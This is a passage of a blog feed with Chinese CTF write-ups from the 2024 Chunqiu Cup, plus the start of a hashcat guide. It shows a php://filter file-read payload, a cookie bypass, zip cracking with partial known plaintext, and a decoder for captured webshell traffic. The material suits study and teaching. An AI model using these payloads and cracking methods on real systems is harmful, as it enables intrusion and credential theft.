class="line">ctfer=6.66999999999999999999999999999999999999999e2</span><br></pre></td></tr></table></figure><p>Hackbar 里设置 cookie 为 pass=admin</p><p><img src="http://cn-sec.com/wp-content/uploads/2025/01/6-1737303857.png" alt="2024春秋杯冬季赛三日Writeup汇总(https://gitee.com/star3119391396/cloudimage/raw/master/img/6-1737303857.png)"></p><p>Include 那里使用 php://filter 配合 convert.iconv 修改字符集使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ile=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><h4 id="音频的秘密">音频的秘密</h4><blockquote><p>考点：知道部分明文破解压缩包</p></blockquote><p>下载附件解压，是一个wav文件，根据提示知道，是deepsound加密，且密码为弱口令。</p><p>用deepsound解密，弱口令密码一个一个试，最后密码为123，得到一个flag.zip</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120222149903.png" alt="image-20250120222149903"></p><p>提取出来，发现需要密码，压缩包内是一张图片。</p><p>用各种工具爆破，发现长时间都没爆破出来，最后赛后复现，看别人wp才知道，明文加密除了使用完整明文文件外，也有一种使用一部分明文文件的爆破方式。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120225951271.png" alt="image-20250120225951271"></p><p>得到一张png图片，在rgb处发现flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120230117284.png" alt="image-20250120230117284"></p><blockquote><p>flag{Y1_Shun_jian_Fa_ZE_Dian_Fu}</p></blockquote><h4 id="Infinity">Infinity</h4><blockquote><p>考点：套娃压缩包，解码</p></blockquote><p>下载压缩包解压，里面是张png图片，放进010editor查看，发现有嵌套文件。</p><p>进行文件分离，得到一个压缩包。</p><p>压缩包里有zip,tar,7z三种，且压缩包名字感觉像是某种编码。</p><p>写脚本直接解压并记下文件名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import tarfile</span><br><span class="line">import py7zr</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip\\&quot;</span><br><span class="line">count = []</span><br><span class="line">txt = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\count.txt&quot;, &quot;w&quot;)</span><br><span class="line">while True:</span><br><span class="line">    contents = os.listdir(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i not in count:</span><br><span class="line">            file_path = path + i</span><br><span class="line">            txt.write(i + &quot;\n&quot;)</span><br><span class="line">            file_extension = i.split(&#x27;.&#x27;)[-1]</span><br><span class="line">            if file_extension == &#x27;zip&#x27;:</span><br><span class="line">                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:</span><br><span class="line">                    zip_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;tar&#x27;:</span><br><span class="line">                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:</span><br><span class="line">                    tar_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;7z&#x27;:</span><br><span class="line">                with py7zr.SevenZipFile(file_path, &#x27;r&#x27;) as seven_ref:</span><br><span class="line">                    seven_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;File extension not supported&quot;)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122143943094.png" alt="image-20250122143943094"></p><p>解压后得到一个SeCr3t.txt，文件内容是Inf1nityIsS0CoOL。</p><p>用脚本对这些字符串进行处理，发现在逆序的时候能根据提示进行解码。即代码中的第二个print。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\Infinity\\flag.txt&quot;, &quot;r&quot;).read()</span><br><span class="line">#文本之中每行有一个字符串</span><br><span class="line">data = data.split(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join(data))  #将每行字符串顺序连接起来</span><br><span class="line">print(&quot;&quot;.join(reversed(data)))  #将每行字符串逆序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in data]))  #将每行字符串反转后顺序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in reversed(data)])) #将每行字符串反转后再逆序连接起来</span><br></pre></td></tr></table></figure><p>根据提示知道，是BASE58-Ripple<code>+</code>SM4-ECB，sm4中的key改为上述文件内容，得到一张条形码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144403181.png" alt="image-20250122144403181"></p><p>由于下载下来的图片是很暗的，很难直接识别，所以要先加白底。简便方法就i是直接预览加截图保存，然后扫描截图。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144536029.png" alt="image-20250122144536029"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144840998.png" alt="image-20250122144840998"></p><blockquote><p>flag{a72dd260-f64d-4116-ab50-b26b40d69883}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.19</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.18</title>
    <link href="https://blog.m3x1.cn/posts/22fad221.html"/>
    <id>https://blog.m3x1.cn/posts/22fad221.html</id>
    <published>2025-01-17T16:00:00.000Z</published>
    <updated>2025-01-18T10:31:24.837Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Weevil’s-Whisper">Weevil’s Whisper</h4><blockquote><p>考点：流量分析，代码审计</p></blockquote><p>下载附件，进行流量分析，看到上传的代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118152835441.png" alt="image-20250118152835441"></p><p>进行代码审计可以知道，在http中的返回结果是由$p$kh$r$kf组成的，而$p,$kh,$kf是固定的，所以可以提取出来$r。</p><p>再看代码，$r是$o进行一系列加密而成，而$o就是执行完成后返回的结果，所以只需要写脚本反解$r就能出现结果。</p><p>exp:</p><p>提取$r的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 示例字符串列表</span><br><span class="line">strings = [</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUFRXAGExNS5kaQ==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUVRSBofUNDFgR2Uu4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6KU+uuy3+Gn+oqy3SgTM2GBxmng==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 定义正则表达式模式</span><br><span class="line">pattern = re.compile(r&#x27;lFDu8RwONqmag5ex45089b3446ee(.*?)4e0d86dbcf92&#x27;)</span><br><span class="line"></span><br><span class="line"># 提取并打印结果</span><br><span class="line">for string in strings:</span><br><span class="line">    match = pattern.search(string)</span><br><span class="line">    if match:</span><br><span class="line">        extracted_string = match.group(1)</span><br><span class="line">        print(f&quot;Extracted: &#123;extracted_string&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;No match found in: &#123;string&#125;&quot;)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>反解$r的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$k=&quot;161ebd7d&quot;;$kh=&quot;45089b3446ee&quot;;$kf=&quot;4e0d86dbcf92&quot;;$p=&quot;lFDu8RwONqmag5ex&quot;;</span><br><span class="line">function x($t,$k)&#123;</span><br><span class="line">  $c=strlen($k);$l=strlen($t);$o=&quot;&quot;;</span><br><span class="line">  for($i=0;$i&lt;$l;)&#123;</span><br><span class="line">    for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">    &#123;</span><br><span class="line">      $o.=$t[$i]^$k[$j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r=array(&quot;SaoCUFRXAGExNS5kaQ==&quot;,&quot;SaoCUVRSBofUNDFgR2Uu&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6KU+uuy3+Gn+oqy3SgTM2GBxmng==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Saq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==&quot;);</span><br><span class="line">for ($i=0;$i&lt;count($r);$i++) &#123;</span><br><span class="line">    $decr=gzuncompress(x(base64_decode($r[$i]),$k));</span><br><span class="line">    print($decr);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118153433654.png" alt="image-20250118153433654"></p><blockquote><p>flag{arsjxh-sjhxbr-3rdd78dfsh-3ndidjl}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.18</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>hashcat常规使用方法</title>
    <link href="https://blog.m3x1.cn/posts/7ca0c84c.html"/>
    <id>https://blog.m3x1.cn/posts/7ca0c84c.html</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-01-18T10:31:24.835Z</updated>
    
    <content type="html"><![CDATA[<h3 id="m-hash的类型">-m hash的类型</h3><p>指定hash的加密类型，默认是MD5类型<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151218880-546683178.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151218880-546683178.png" alt="img"></a><br>在对应的类型前面有它的id,可以通过id来指定类型<br>当我们想要找一个类型在<code>hashcat</code>支不支持的时候，例如windows系统加密的是NTML,可以执行命令<br><code>hashcat64.exe -h | findstr NTLM</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151441885-831306097.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151441885-831306097.png" alt="img"></a><br>可以看到<code>NTLM</code>的ID号为<code>1000</code></p><h3 id="a-攻击方式">-a 攻击方式</h3><p>破解密码的方式<br>分别有:</p><p>highlighter- 1c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 | Straight  字典破解</span><br><span class="line">1 | Combination  组合破解</span><br><span class="line">3 | Brute-force  掩码破解</span><br><span class="line">6 | Hybrid Wordlist + Mask  混合字典 + 掩码</span><br><span class="line">7 | Hybrid Mask + Wordlist  混合掩码 +  字典</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323150232206-1864847787.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323150232206-1864847787.png" alt="img"></a></p><h3 